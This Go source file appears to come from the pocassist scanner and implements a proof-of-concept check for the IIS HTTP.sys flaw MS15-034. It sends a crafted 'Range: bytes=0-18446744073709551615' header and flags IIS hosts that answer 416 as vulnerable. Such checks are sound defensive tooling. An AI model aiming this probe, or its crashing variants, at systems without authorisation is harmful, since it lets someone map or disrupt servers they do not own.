package scripts

import (
	"bytes"
	"fmt"
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
	"strings"
)

// MS15034
func MS15034(args *ScriptScanArgs) (*util.ScanResult, error) {
	rawUrl := ConstructUrl(args, "/")

	// 定义报文列表
	var respList []*proto.Response

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)
	fastReq.SetRequestURI(rawUrl)
	fastReq.Header.SetMethod(fasthttp.MethodGet)
	fastReq.Header.Set("Range", "bytes=0-18446744073709551615")

	if fastReq.Header.Host() == nil || len(fastReq.Header.Host()) == 0 {
		curHost := args.Host + ":" + fmt.Sprint(args.Port)
		fastReq.Header.Set("Host", curHost)
		fastReq.SetHost(curHost)
	}
	resp, err := util.DoFasthttpRequest(fastReq,false)
	if err != nil {
		util.ResponsePut(resp)
		return nil, err
	}
	server, ok := resp.Headers["Server"]
	if ok {
		if !strings.Contains(server, "IIS") {
			util.ResponsePut(resp)
			return &util.InVulnerableResult, nil
		}
		if resp.Status == 416 || bytes.Contains(resp.Body, []byte("Requested Range Not Satisfiable")) {
			return util.VulnerableHttpResult(rawUrl,"", append(respList, resp)), nil
		}
	}
	util.ResponsePut(resp)
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-iis-ms15034", MS15034)
}
